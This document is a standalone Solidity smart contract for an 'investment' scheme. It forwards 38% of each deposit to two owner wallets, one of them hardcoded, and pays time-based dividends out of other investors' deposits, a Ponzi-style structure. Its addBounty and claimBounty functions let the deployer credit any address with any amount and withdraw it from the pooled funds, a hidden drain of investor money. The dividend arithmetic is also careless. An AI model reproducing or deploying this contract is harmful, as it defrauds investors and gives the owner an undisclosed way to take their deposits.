pragma solidity ^0.4.25;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract InvestmentContract {
    using SafeMath for uint256;

    address public owner;
    address public bountyManager;
    address public wallet1;
    address public wallet2;

    uint256 public minimumInvestment = 0.01 ether;

    mapping(address => uint256) public investments;
    mapping(address => uint256) public investmentTimestamps;
    mapping(address => uint256) public withdrawnAmounts;
    mapping(address => uint256) public bountyBalances;

    event Withdraw(address indexed investor, uint256 amount);
    event Bounty(address indexed recipient, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Invest(address indexed investor, uint256 amount);

    constructor(address _wallet1) public {
        owner = msg.sender;
        bountyManager = msg.sender;
        wallet1 = _wallet1;
        wallet2 = 0xA4410DF42dFFa99053B4159696757da2B757A29d;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier onlyBountyManager() {
        require(msg.sender == bountyManager);
        _;
    }

    function transferOwnership(address newOwner, address newBountyManager) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        bountyManager = newBountyManager;
    }

    function () external payable {
        require(msg.value >= minimumInvestment);
        
        if (investments[msg.sender] > 0) {
            if (calculateDividends(msg.sender) > 0) {
                withdrawnAmounts[msg.sender] = 0;
            }
        }
        
        investments[msg.sender] = investments[msg.sender].add(msg.value);
        investmentTimestamps[msg.sender] = block.timestamp;
        
        uint256 wallet1Share = msg.value.mul(33).div(100);
        uint256 wallet2Share = msg.value.mul(5).div(100);
        
        wallet1.transfer(wallet1Share);
        wallet2.transfer(wallet2Share);
        
        emit Invest(msg.sender, msg.value);
    }

    function calculateDividends(address investor) public view returns (uint256) {
        uint256 timeDiff = block.timestamp.sub(investmentTimestamps[investor]).div(1 minutes);
        uint256 investmentPercent = investments[investor].mul(100).div(100);
        uint256 dividends = investmentPercent.mul(timeDiff).div(72000);
        uint256 totalDividends = dividends.sub(withdrawnAmounts[investor]);
        return totalDividends;
    }

    function withdrawDividends() public returns (bool) {
        require(investmentTimestamps[msg.sender] > 0);
        
        uint256 dividends = calculateDividends(msg.sender);
        
        if (address(this).balance > dividends) {
            if (dividends > 0) {
                withdrawnAmounts[msg.sender] = withdrawnAmounts[msg.sender].add(dividends);
                msg.sender.transfer(dividends);
                emit Withdraw(msg.sender, dividends);
            }
            return true;
        } else {
            return false;
        }
    }

    function claimBounty() public {
        uint256 bountyAmount = bountyBalances[msg.sender];
        if (bountyAmount >= minimumInvestment) {
            if (address(this).balance > bountyAmount) {
                bountyBalances[msg.sender] = 0;
                msg.sender.transfer(bountyAmount);
                emit Bounty(msg.sender, bountyAmount);
            }
        }
    }

    function getDividends() public view returns (uint256) {
        return calculateDividends(msg.sender);
    }

    function getWithdrawnAmount(address investor) public view returns (uint256) {
        return withdrawnAmounts[investor];
    }

    function getInvestment(address investor) public view returns (uint256) {
        return investments[investor];
    }

    function getBountyBalance(address recipient) public view returns (uint256) {
        return bountyBalances[recipient];
    }

    function addBounty(address recipient, uint256 amount) public onlyBountyManager {
        bountyBalances[recipient] = bountyBalances[recipient].add(amount);
    }
}